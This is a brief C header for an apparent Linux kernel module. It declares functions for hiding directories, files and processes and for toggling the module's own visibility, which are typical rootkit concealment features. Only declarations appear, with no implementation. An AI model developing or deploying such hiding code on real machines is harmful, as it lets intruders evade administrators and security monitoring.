#ifndef HIDDEN_H
#define HIDDEN_H
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/init_task.h>
#include <linux/string.h>
#define DIR_PATH_NR 0x30
#define FILE_PATH_NR 0x30
#define PATH_NR 0x100



/* 文件夹的简单隐藏 */
ssize_t dir_hidden_weak(char *);
/* 普通文件遍历的隐藏 */
ssize_t file_hidden(char *);

ssize_t module_toggle(void);

ssize_t process_hidden(int);
#endif
